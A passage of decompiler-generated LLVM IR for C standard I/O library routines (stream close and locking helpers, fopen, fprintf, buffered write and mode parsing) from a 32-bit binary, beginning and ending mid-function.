  call void @__pseudo_cond_branch(i1 %v1_80640e0, i32 134627903)
  ret i32 %v3_80640db

; uselistorder directives
  uselistorder i1 %v16_80640db, { 1, 0 }
  uselistorder i32 %v3_80640db, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80640e6() local_unnamed_addr {
dec_label_pc_80640e6:
  %edi.global-to-local = alloca i32, align 4
  %v0_80640e6 = load i32, i32* @edx, align 4
  %v1_80640e6 = load i32, i32* @ebx, align 4
  %v2_80640e6 = add i32 %v1_80640e6, 64
  %v3_80640e6 = inttoptr i32 %v2_80640e6 to i32*
  store i32 %v0_80640e6, i32* %v3_80640e6, align 4
  %v0_80640e9 = load i32, i32* @ebx, align 4
  %v1_80640e9 = add i32 %v0_80640e9, 60
  %v2_80640e9 = inttoptr i32 %v1_80640e9 to i32*
  %v3_80640e9 = load i32, i32* %v2_80640e9, align 4
  %v4_80640e9 = add i32 %v3_80640e9, 1
  store i32 %v4_80640e9, i32* %v2_80640e9, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_80640ee = load i32, i32* @ebx, align 4
  %v1_80640ee = inttoptr i32 %v0_80640ee to i8*
  %v2_80640ee = load i8, i8* %v1_80640ee, align 1
  %v3_80640ee = and i8 %v2_80640ee, 64
  %v4_80640ee = icmp eq i8 %v3_80640ee, 0
  br i1 %v4_80640ee, label %dec_label_pc_80640e6.dec_label_pc_8064101_crit_edge, label %dec_label_pc_80640f3

dec_label_pc_80640e6.dec_label_pc_8064101_crit_edge: ; preds = %dec_label_pc_80640e6
  br label %dec_label_pc_8064101

dec_label_pc_80640f3:                             ; preds = %dec_label_pc_80640e6
  %v1_80640f7 = call i32 @fflush_unlocked(i32 %v0_80640ee)
  store i32 %v1_80640f7, i32* @eax, align 4
  store i32 %v1_80640f7, i32* %edi.global-to-local, align 4
  %v0_8064104.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064101

dec_label_pc_8064101:                             ; preds = %dec_label_pc_80640e6.dec_label_pc_8064101_crit_edge, %dec_label_pc_80640f3
  %v0_8064104 = phi i32 [ %v0_80640ee, %dec_label_pc_80640e6.dec_label_pc_8064101_crit_edge ], [ %v0_8064104.pre, %dec_label_pc_80640f3 ]
  %v1_8064104 = add i32 %v0_8064104, 4
  %v2_8064104 = inttoptr i32 %v1_8064104 to i32*
  %v3_8064104 = load i32, i32* %v2_8064104, align 4
  %v1_8064107 = call i32 @__GI___libc_close(i32 %v3_8064104)
  %v0_806410f = load i32, i32* @ebx, align 4
  %v1_806410f = add i32 %v0_806410f, 4
  %v2_806410f = inttoptr i32 %v1_806410f to i32*
  store i32 -1, i32* %v2_806410f, align 4
  %v2_8064116 = icmp slt i32 %v1_8064107, 0
  %v1_806411d = load i32, i32* %edi.global-to-local, align 4
  %v3_806411d = select i1 %v2_8064116, i32 -1, i32 %v1_806411d
  store i32 %v3_806411d, i32* %edi.global-to-local, align 4
  %v0_8064120 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_8064127 = load i32, i32* @global_var_8075b78.1567, align 8
  %v12_8064127 = icmp eq i32 %v0_8064127, %v0_8064120
  call void @__pseudo_cond_branch(i1 %v12_8064127, i32 ptrtoint (i32* @global_var_8064154.1672 to i32))
  %v0_8064136 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064136 = icmp eq i32 %v0_8064136, 0
  call void @__pseudo_cond_branch(i1 %v1_8064136, i32 134627649)
  %v0_8064140 = load i32, i32* @global_var_8075b70.1569, align 16
  %v13_8064140 = icmp eq i32 %v0_8064140, 0
  %v20_8064140 = select i1 %v13_8064140, i32 1, i32 %v0_8064140
  store i32 %v20_8064140, i32* @global_var_8075b70.1569, align 16
  %v1_8064148 = icmp eq i1 %v13_8064140, false
  call void @__pseudo_cond_branch(i1 %v1_8064148, i32 134627916)
  ret i32 %v0_8064140

; uselistorder directives
  uselistorder i32 %v0_8064140, { 0, 2, 1 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8064101, { 1, 0 }
}

define i32 @function_806414e() local_unnamed_addr {
dec_label_pc_806414e:
  %v0_806414e = load i32, i32* @edx, align 4
  store i32 %v0_806414e, i32* @global_var_8075b78.1567, align 8
  %v0_8064154 = load i32, i32* @global_var_8075b7c.1673, align 4
  %v0_8064159 = load i32, i32* @global_var_8075b74.1568, align 4
  %v1_806415f = add i32 %v0_8064154, 1
  %v1_8064160 = icmp eq i32 %v0_8064159, 0
  store i32 %v1_806415f, i32* @global_var_8075b7c.1673, align 4
  %v1_8064167 = icmp eq i1 %v1_8064160, false
  call void @__pseudo_cond_branch(i1 %v1_8064167, i32 134627723)
  store i32 0, i32* @global_var_8075b78.1567, align 8
  %v0_8064173 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064173 = icmp eq i32 %v0_8064173, 0
  call void @__pseudo_cond_branch(i1 %v1_8064173, i32 134627710)
  %v0_806417d = load i32, i32* @global_var_8075b70.1569, align 16
  %v1_806417d = add i32 %v0_806417d, -1
  %v9_806417d = icmp eq i32 %v1_806417d, 0
  store i32 %v1_806417d, i32* @global_var_8075b70.1569, align 16
  %v1_8064185 = icmp eq i1 %v9_806417d, false
  call void @__pseudo_cond_branch(i1 %v1_8064185, i32 134627932)
  ret i32 %v1_806415f

; uselistorder directives
  uselistorder i32 %v1_806417d, { 1, 0 }
}

define i32 @function_806418b() local_unnamed_addr {
dec_label_pc_806418b:
  %v0_806418b = load i32, i32* @ebx, align 4
  %v1_806418b = inttoptr i32 %v0_806418b to i32*
  %v2_806418b = load i32, i32* %v1_806418b, align 4
  %v1_806418d = and i32 %v2_806418b, 24576
  %v1_8064192 = or i32 %v1_806418d, 48
  %v0_8064195 = load i32, i32* @esi, align 4
  %v1_8064195 = icmp eq i32 %v0_8064195, 0
  %v1_8064197 = trunc i32 %v1_8064192 to i16
  %v3_8064197 = inttoptr i32 %v0_806418b to i16*
  store i16 %v1_8064197, i16* %v3_8064197, align 2
  %v1_806419a = icmp eq i1 %v1_8064195, false
  call void @__pseudo_cond_branch(i1 %v1_806419a, i32 134627779)
  %v0_806419c = load i32, i32* @ebx, align 4
  %v1_806419c = add i32 %v0_806419c, 60
  %v2_806419c = inttoptr i32 %v1_806419c to i32*
  %v3_806419c = load i32, i32* %v2_806419c, align 4
  %v1_806419f = add i32 %v3_806419c, -1
  %v8_806419f = icmp eq i32 %v1_806419f, 0
  store i32 %v1_806419f, i32* %v2_806419c, align 4
  %v1_80641a5 = icmp eq i1 %v8_806419f, false
  call void @__pseudo_cond_branch(i1 %v1_80641a5, i32 134627779)
  %v0_80641a7 = load i32, i32* @ebx, align 4
  %v1_80641a7 = add i32 %v0_80641a7, 64
  %v2_80641a7 = inttoptr i32 %v1_80641a7 to i32*
  store i32 0, i32* %v2_80641a7, align 4
  %v0_80641ae = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80641ae = icmp eq i32 %v0_80641ae, 0
  call void @__pseudo_cond_branch(i1 %v1_80641ae, i32 134627769)
  %v0_80641b8 = load i32, i32* @ebx, align 4
  %v1_80641b8 = add i32 %v0_80641b8, 56
  %v2_80641b8 = inttoptr i32 %v1_80641b8 to i32*
  %v3_80641b8 = load i32, i32* %v2_80641b8, align 4
  %v4_80641b8 = add i32 %v3_80641b8, -1
  %v12_80641b8 = icmp eq i32 %v4_80641b8, 0
  store i32 %v4_80641b8, i32* %v2_80641b8, align 4
  %v1_80641bd = icmp eq i1 %v12_80641b8, false
  call void @__pseudo_cond_branch(i1 %v1_80641bd, i32 134627948)
  ret i32 %v1_806419f

; uselistorder directives
  uselistorder i32 %v4_80641b8, { 1, 0 }
}

define i32 @function_80641c3() local_unnamed_addr {
dec_label_pc_80641c3:
  %v0_80641c3 = load i32, i32* @ebx, align 4
  %v1_80641c3 = add i32 %v0_80641c3, 1
  %v2_80641c3 = inttoptr i32 %v1_80641c3 to i8*
  %v3_80641c3 = load i8, i8* %v2_80641c3, align 1
  %v4_80641c3 = and i8 %v3_80641c3, 64
  %v5_80641c3 = icmp eq i8 %v4_80641c3, 0
  br i1 %v5_80641c3, label %dec_label_pc_80641d7, label %dec_label_pc_80641c9

dec_label_pc_80641c9:                             ; preds = %dec_label_pc_80641c3
  %v1_80641cc = add i32 %v0_80641c3, 8
  %v2_80641cc = inttoptr i32 %v1_80641cc to i32*
  %v3_80641cc = load i32, i32* %v2_80641cc, align 4
  %v1_80641cf = call i32 @free(i32 %v3_80641cc)
  br label %dec_label_pc_80641d7

dec_label_pc_80641d7:                             ; preds = %dec_label_pc_80641c3, %dec_label_pc_80641c9
  %v0_80641d7 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_80641de = load i32, i32* @global_var_8075b78.1567, align 8
  %v12_80641de = icmp eq i32 %v0_80641de, %v0_80641d7
  call void @__pseudo_cond_branch(i1 %v12_80641de, i32 ptrtoint (i32* @global_var_8064207.1674 to i32))
  %v0_80641ed = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80641ed = icmp eq i32 %v0_80641ed, 0
  call void @__pseudo_cond_branch(i1 %v1_80641ed, i32 134627832)
  %v0_80641f7 = load i32, i32* @global_var_8075b70.1569, align 16
  %v13_80641f7 = icmp eq i32 %v0_80641f7, 0
  %v20_80641f7 = select i1 %v13_80641f7, i32 1, i32 %v0_80641f7
  store i32 %v20_80641f7, i32* @global_var_8075b70.1569, align 16
  %v1_80641ff = icmp eq i1 %v13_80641f7, false
  call void @__pseudo_cond_branch(i1 %v1_80641ff, i32 134627961)
  ret i32 %v0_80641f7

; uselistorder directives
  uselistorder i32 %v0_80641f7, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80641d7, { 1, 0 }
}

define i32 @function_8064201() local_unnamed_addr {
dec_label_pc_8064201:
  %v0_8064201 = load i32, i32* @edx, align 4
  store i32 %v0_8064201, i32* @global_var_8075b78.1567, align 8
  %v0_8064207 = load i32, i32* @global_var_8075b74.1568, align 4
  %v0_806420c = load i32, i32* @global_var_8075b80.1675, align 128
  %v1_806420c = add i32 %v0_806420c, 1
  store i32 %v1_806420c, i32* @global_var_8075b80.1675, align 128
  %v1_8064212 = icmp eq i32 %v0_8064207, 0
  %v1_8064214 = icmp eq i1 %v1_8064212, false
  call void @__pseudo_cond_branch(i1 %v1_8064214, i32 134627892)
  store i32 0, i32* @global_var_8075b78.1567, align 8
  %v0_8064220 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064220 = icmp eq i32 %v0_8064220, 0
  call void @__pseudo_cond_branch(i1 %v1_8064220, i32 134627883)
  %v0_806422a = load i32, i32* @global_var_8075b70.1569, align 16
  %v1_806422a = add i32 %v0_806422a, -1
  %v9_806422a = icmp eq i32 %v1_806422a, 0
  store i32 %v1_806422a, i32* @global_var_8075b70.1569, align 16
  %v1_8064232 = icmp eq i1 %v9_806422a, false
  call void @__pseudo_cond_branch(i1 %v1_8064232, i32 134627977)
  ret i32 %v0_8064207

; uselistorder directives
  uselistorder i32 %v1_806422a, { 1, 0 }
}

define i32 @function_8064234() local_unnamed_addr {
dec_label_pc_8064234:
  %v0_8064234 = call i32 @_stdio_openlist_dec_use()
  %v0_8064239 = load i32, i32* @edi, align 4
  ret i32 %v0_8064239
}

define i32 @_L_lock_18.1() local_unnamed_addr {
entry:
  %v0_806423f = load i32, i32* @ebx, align 4
  %v1_806423f = add i32 %v0_806423f, 56
  store i32 %v1_806423f, i32* @ecx, align 4
  %v0_8064242 = call i32 @__lll_lock_wait_private()
  store i32 %v0_8064242, i32* @eax, align 4
  %v0_8064247 = call i32 @function_80640e6()
  ret i32 %v0_8064247
}

define i32 @_L_lock_53() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @ecx, align 4
  %v0_8064252 = call i32 @__lll_lock_wait_private()
  %v0_8064257 = call i32 @function_806414e()
  ret i32 %v0_8064257
}

define i32 @_L_unlock_65() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @eax, align 4
  %v0_8064262 = call i32 @__lll_unlock_wake_private()
  %v0_8064267 = call i32 @function_806418b()
  ret i32 %v0_8064267
}

define i32 @_L_unlock_82() local_unnamed_addr {
entry:
  %v0_806426c = load i32, i32* @ebx, align 4
  %v1_806426c = add i32 %v0_806426c, 56
  store i32 %v1_806426c, i32* @eax, align 4
  %v0_806426f = call i32 @__lll_unlock_wake_private()
  %v0_8064274 = call i32 @function_80641c3()
  ret i32 %v0_8064274
}

define i32 @_L_lock_103() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @ecx, align 4
  %v0_806427f = call i32 @__lll_lock_wait_private()
  %v0_8064284 = call i32 @function_8064201()
  ret i32 %v0_8064284
}

define i32 @_L_unlock_113.2() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @eax, align 4
  %v0_806428f = call i32 @__lll_unlock_wake_private()
  %v0_8064294 = call i32 @function_8064234()
  ret i32 %v0_8064294
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80642a7 = inttoptr i32 %arg2 to i8*
  %v5_80642a7 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80642a7, i32 0, i32 -1)
  ret i32 %v5_80642a7
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80642b3 = ptrtoint i32* %stack_var_12 to i32
  %v0_80642bb = load i32, i32* @edx, align 4
  %v4_80642c5 = call i32 @__GI_vfprintf(i32 %arg1, i32 %arg2, i32 %v2_80642b3, i32 %v0_80642bb)
  ret i32 %v4_80642c5
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  store i32 %arg3, i32* %ebp.global-to-local, align 4
  %v4_80642db = ptrtoint i16* %arg1 to i32
  store i32 %v4_80642db, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v1_80643534 = icmp eq i32 %arg3, 0
  store i1 %v1_80643534, i1* %zf.global-to-local, align 1
  %v1_806435611 = icmp eq i1 %v1_80643534, false
  br i1 %v1_806435611, label %dec_label_pc_80642e7.lr.ph, label %dec_label_pc_8064358

dec_label_pc_80642e7.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80642e7

dec_label_pc_80642e7:                             ; preds = %dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge, %dec_label_pc_80642e7.lr.ph
  %v0_80642f2 = phi i32 [ %v4_80642db, %dec_label_pc_80642e7.lr.ph ], [ %v0_80642f2.pre, %dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge ]
  %v0_80642f1 = phi i32 [ %arg2, %dec_label_pc_80642e7.lr.ph ], [ %v2_8064303, %dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge ]
  %v0_80642ec.in = phi i32 [ %arg3, %dec_label_pc_80642e7.lr.ph ], [ %v2_8064301, %dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge ]
  %v4_80642ec = phi i32 [ %arg3, %dec_label_pc_80642e7.lr.ph ], [ %v2_8064301, %dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge ]
  %v0_80642ec = icmp slt i32 %v0_80642ec.in, 0
  %v2_80642ec = icmp eq i1 %v0_80642ec, false
  %v5_80642ec = select i1 %v2_80642ec, i32 %v4_80642ec, i32 2147483647
  store i32 %v5_80642ec, i32* @eax, align 4
  %v1_80642f2 = add i32 %v0_80642f2, 4
  %v2_80642f2 = inttoptr i32 %v1_80642f2 to i32*
  %v3_80642f2 = load i32, i32* %v2_80642f2, align 4
  %v4_80642f5 = call i32 @__GI___libc_write(i32 %v3_80642f2, i32 %v0_80642f1, i32 %v5_80642ec)
  store i32 %v4_80642f5, i32* %eax.global-to-local, align 4
  %v1_80642fd = icmp eq i32 %v4_80642f5, 0
  store i1 %v1_80642fd, i1* %zf.global-to-local, align 1
  %v2_80642fd = icmp slt i32 %v4_80642f5, 0
  br i1 %v2_80642fd, label %dec_label_pc_8064307, label %dec_label_pc_8064301

dec_label_pc_8064301:                             ; preds = %dec_label_pc_80642e7
  %v0_8064301 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064301 = sub i32 %v0_8064301, %v4_80642f5
  %v12_8064301 = icmp eq i32 %v2_8064301, 0
  store i32 %v2_8064301, i32* %ebx.global-to-local, align 4
  %v0_8064303 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064303 = add i32 %v0_8064303, %v4_80642f5
  store i32 %v2_8064303, i32* %esi.global-to-local, align 4
  store i1 %v12_8064301, i1* %zf.global-to-local, align 1
  %v1_8064356 = icmp eq i1 %v12_8064301, false
  br i1 %v1_8064356, label %dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge, label %dec_label_pc_8064358

dec_label_pc_8064301.dec_label_pc_80642e7_crit_edge: ; preds = %dec_label_pc_8064301
  %v0_80642f2.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80642e7

dec_label_pc_8064307:                             ; preds = %dec_label_pc_80642e7
  %v0_8064307 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064307 = inttoptr i32 %v0_8064307 to i32*
  %v2_8064307 = load i32, i32* %v1_8064307, align 4
  %v1_8064309 = or i32 %v2_8064307, 8
  %v1_806430c = trunc i32 %v1_8064309 to i16
  %v3_806430c = inttoptr i32 %v0_8064307 to i16*
  store i16 %v1_806430c, i16* %v3_806430c, align 2
  store i32 -8, i32* %eax.global-to-local, align 4
  %v2_8064314 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_8064314, i32* %eax.global-to-local, align 4
  %v9_8064317 = icmp eq i32 %v2_8064314, 4
  store i1 %v9_8064317, i1* %zf.global-to-local, align 1
  br i1 %v9_8064317, label %dec_label_pc_8064321, label %dec_label_pc_806431c

dec_label_pc_806431c:                             ; preds = %dec_label_pc_8064307
  %v9_806431c = icmp eq i32 %v2_8064314, 11
  store i1 %v9_806431c, i1* %zf.global-to-local, align 1
  %v1_806431f = icmp eq i1 %v9_806431c, false
  br i1 %v1_806431f, label %dec_label_pc_8064358, label %dec_label_pc_8064321

dec_label_pc_8064321:                             ; preds = %dec_label_pc_806431c, %dec_label_pc_8064307
  %v0_8064321 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064321 = add i32 %v0_8064321, 12
  %v2_8064321 = inttoptr i32 %v1_8064321 to i32*
  %v3_8064321 = load i32, i32* %v2_8064321, align 4
  store i32 %v3_8064321, i32* %eax.global-to-local, align 4
  %v1_8064324 = add i32 %v0_8064321, 8
  %v2_8064324 = inttoptr i32 %v1_8064324 to i32*
  %v3_8064324 = load i32, i32* %v2_8064324, align 4
  store i32 %v3_8064324, i32* @edx, align 4
  %v2_8064329 = sub i32 %v3_8064321, %v3_8064324
  %v12_8064329 = icmp eq i32 %v2_8064329, 0
  store i1 %v12_8064329, i1* %zf.global-to-local, align 1
  store i32 %v2_8064329, i32* @ecx, align 4
  %v1_806434f.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v12_8064329, label %dec_label_pc_806434f, label %dec_label_pc_806432d

dec_label_pc_806432d:                             ; preds = %dec_label_pc_8064321
  %v12_806432d = icmp eq i32 %v2_8064329, %v1_806434f.pre
  store i1 %v12_806432d, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8064329, %v1_806434f.pre
  %v5_806432f = select i1 %tmp, i32 %v2_8064329, i32 %v1_806434f.pre
  store i32 %v5_806432f, i32* @ecx, align 4
  %v0_8064332.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8064332

dec_label_pc_8064332:                             ; preds = %dec_label_pc_8064344, %dec_label_pc_806432d
  %v2_8064336 = phi i32 [ %v1_8064340, %dec_label_pc_8064344 ], [ %v3_8064324, %dec_label_pc_806432d ]
  %v4_8064332 = phi i32 [ %v4_8064332.pre, %dec_label_pc_8064344 ], [ %v3_8064321, %dec_label_pc_806432d ]
  %v0_8064332 = phi i32 [ %v1_8064344, %dec_label_pc_8064344 ], [ %v0_8064332.pre, %dec_label_pc_806432d ]
  %v1_8064332 = inttoptr i32 %v0_8064332 to i8*
  %v2_8064332 = load i8, i8* %v1_8064332, align 1
  %v3_8064332 = zext i8 %v2_8064332 to i32
  %v5_8064332 = and i32 %v4_8064332, -256
  %v6_8064332 = or i32 %v3_8064332, %v5_8064332
  store i32 %v6_8064332, i32* %eax.global-to-local, align 4
  %v10_8064334 = icmp eq i8 %v2_8064332, 10
  store i1 %v10_8064334, i1* %zf.global-to-local, align 1
  %v3_8064336 = inttoptr i32 %v2_8064336 to i8*
  store i8 %v2_8064332, i8* %v3_8064336, align 1
  %v0_8064338 = load i1, i1* %zf.global-to-local, align 1
  %v1_8064338 = icmp eq i1 %v0_8064338, false
  br i1 %v1_8064338, label %dec_label_pc_8064340, label %dec_label_pc_806433a

dec_label_pc_806433a:                             ; preds = %dec_label_pc_8064332
  %v0_806433a = load i32, i32* %edi.global-to-local, align 4
  %v1_806433a = add i32 %v0_806433a, 1
  %v2_806433a = inttoptr i32 %v1_806433a to i8*
  %v3_806433a = load i8, i8* %v2_806433a, align 1
  %v4_806433a = urem i8 %v3_806433a, 2
  %v5_806433a = icmp eq i8 %v4_806433a, 0
  store i1 %v5_806433a, i1* %zf.global-to-local, align 1
  %v1_806433e = icmp eq i1 %v5_806433a, false
  br i1 %v1_806433e, label %dec_label_pc_806433a.dec_label_pc_8064347_crit_edge, label %dec_label_pc_8064340

dec_label_pc_806433a.dec_label_pc_8064347_crit_edge: ; preds = %dec_label_pc_806433a
  %v0_8064347.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8064347

dec_label_pc_8064340:                             ; preds = %dec_label_pc_806433a, %dec_label_pc_8064332
  %v0_8064340 = load i32, i32* @edx, align 4
  %v1_8064340 = add i32 %v0_8064340, 1
  store i32 %v1_8064340, i32* @edx, align 4
  %v0_8064341 = load i32, i32* @ecx, align 4
  %v1_8064341 = add i32 %v0_8064341, -1
  %v8_8064341 = icmp eq i32 %v1_8064341, 0
  store i1 %v8_8064341, i1* %zf.global-to-local, align 1
  store i32 %v1_8064341, i32* @ecx, align 4
  br i1 %v8_8064341, label %dec_label_pc_8064340.dec_label_pc_8064347_crit_edge, label %dec_label_pc_8064344

dec_label_pc_8064340.dec_label_pc_8064347_crit_edge: ; preds = %dec_label_pc_8064340
  %v1_8064347.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8064347

dec_label_pc_8064344:                             ; preds = %dec_label_pc_8064340
  %v0_8064344 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064344 = add i32 %v0_8064344, 1
  %v8_8064344 = icmp eq i32 %v1_8064344, 0
  store i1 %v8_8064344, i1* %zf.global-to-local, align 1
  store i32 %v1_8064344, i32* %esi.global-to-local, align 4
  %v4_8064332.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064332

dec_label_pc_8064347:                             ; preds = %dec_label_pc_8064340.dec_label_pc_8064347_crit_edge, %dec_label_pc_806433a.dec_label_pc_8064347_crit_edge
  %v1_8064347 = phi i32 [ %v0_806433a, %dec_label_pc_806433a.dec_label_pc_8064347_crit_edge ], [ %v1_8064347.pre, %dec_label_pc_8064340.dec_label_pc_8064347_crit_edge ]
  %v0_8064347 = phi i32 [ %v0_8064347.pre, %dec_label_pc_806433a.dec_label_pc_8064347_crit_edge ], [ %v1_8064340, %dec_label_pc_8064340.dec_label_pc_8064347_crit_edge ]
  %v2_8064347 = add i32 %v1_8064347, 16
  %v3_8064347 = inttoptr i32 %v2_8064347 to i32*
  store i32 %v0_8064347, i32* %v3_8064347, align 4
  %v0_806434a = load i32, i32* @edx, align 4
  %v1_806434a = load i32, i32* %edi.global-to-local, align 4
  %v2_806434a = add i32 %v1_806434a, 8
  %v3_806434a = inttoptr i32 %v2_806434a to i32*
  %v4_806434a = load i32, i32* %v3_806434a, align 4
  %v5_806434a = sub i32 %v0_806434a, %v4_806434a
  store i32 %v5_806434a, i32* @edx, align 4
  %v0_806434d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806434d = sub i32 %v0_806434d, %v5_806434a
  %v12_806434d = icmp eq i32 %v2_806434d, 0
  store i1 %v12_806434d, i1* %zf.global-to-local, align 1
  store i32 %v2_806434d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806434f

dec_label_pc_806434f:                             ; preds = %dec_label_pc_8064321, %dec_label_pc_8064347
  %v1_806434f = phi i32 [ %v2_806434d, %dec_label_pc_8064347 ], [ %v1_806434f.pre, %dec_label_pc_8064321 ]
  %v0_806434f = load i32, i32* %ebp.global-to-local, align 4
  %v2_806434f = sub i32 %v0_806434f, %v1_806434f
  %v12_806434f = icmp eq i32 %v2_806434f, 0
  store i1 %v12_806434f, i1* %zf.global-to-local, align 1
  store i32 %v2_806434f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8064358

dec_label_pc_8064358:                             ; preds = %dec_label_pc_8064301, %entry, %dec_label_pc_806431c, %dec_label_pc_806434f
  %v0_8064358 = load i32, i32* @esp, align 4
  %v9_8064358 = icmp eq i32 %v0_8064358, -12
  store i1 %v9_8064358, i1* %zf.global-to-local, align 1
  %v0_806435b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_806435b, i32* %eax.global-to-local, align 4
  ret i32 %v0_806435b

; uselistorder directives
  uselistorder i32 %v1_8064344, { 1, 2, 0 }
  uselistorder i32 %v1_8064341, { 1, 0 }
  uselistorder i32 %v1_8064340, { 0, 2, 1 }
  uselistorder i8 %v2_8064332, { 1, 0, 2 }
  uselistorder i32 %v1_806434f.pre, { 2, 3, 0, 1 }
  uselistorder i32 %v2_8064329, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v9_806431c, { 1, 0 }
  uselistorder i1 %v9_8064317, { 1, 0 }
  uselistorder i32 %v2_8064303, { 1, 0 }
  uselistorder i32 %v2_8064301, { 2, 3, 0, 1 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 5, 2, 3, 4, 0, 6 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_write, { 0, 2, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_8064358, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_806434f, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v4_806436b = ptrtoint i8* %arg2 to i32
  store i32 %v4_806436b, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_806437b = load i8, i8* %arg2, align 1
  %v3_806437b = zext i8 %v2_806437b to i32
  %v4_806437b = load i32, i32* @eax, align 4
  %v5_806437b = and i32 %v4_806437b, -256
  %v6_806437b = or i32 %v5_806437b, %v3_806437b
  store i32 %v6_806437b, i32* %eax.global-to-local, align 4
  %v10_806437d = icmp eq i8 %v2_806437b, 114
  br i1 %v10_806437d, label %dec_label_pc_80643c3, label %dec_label_pc_8064381

dec_label_pc_8064381:                             ; preds = %entry
  %v10_8064381 = icmp eq i8 %v2_806437b, 119
  store i32 577, i32* @esi, align 4
  br i1 %v10_8064381, label %dec_label_pc_80643c5, label %dec_label_pc_806438a

dec_label_pc_806438a:                             ; preds = %dec_label_pc_8064381
  %v10_806438a = icmp eq i8 %v2_806437b, 97
  store i32 1089, i32* @esi, align 4
  br i1 %v10_806438a, label %dec_label_pc_80643c5, label %dec_label_pc_8064392

dec_label_pc_8064392:                             ; preds = %dec_label_pc_8064443, %dec_label_pc_806441d, %dec_label_pc_806438a
  store i32 -8, i32* %eax.global-to-local, align 4
  %v0_8064397 = load i32, i32* @ebx, align 4
  %v1_8064397 = icmp eq i32 %v0_8064397, 0
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  call void @__pseudo_cond_branch(i1 %v1_8064397, i32 134628883)
  br label %dec_label_pc_80643a6

dec_label_pc_80643a6:                             ; preds = %dec_label_pc_8064466, %dec_label_pc_8064392
  %v0_80643a6 = load i32, i32* @ebx, align 4
  %v1_80643a6 = add i32 %v0_80643a6, 1
  %v2_80643a6 = inttoptr i32 %v1_80643a6 to i8*
  %v3_80643a6 = load i8, i8* %v2_80643a6, align 1
  %v4_80643a6 = and i8 %v3_80643a6, 32
  %v5_80643a6 = icmp eq i8 %v4_80643a6, 0
  call void @__pseudo_cond_branch(i1 %v5_80643a6, i32 134628883)
  %v0_80643b3 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80643b6 = call i32 @free(i32 %v0_80643b3)
  store i32 %v1_80643b6, i32* %eax.global-to-local, align 4
  %v0_80643be = call i32 @function_8064615()
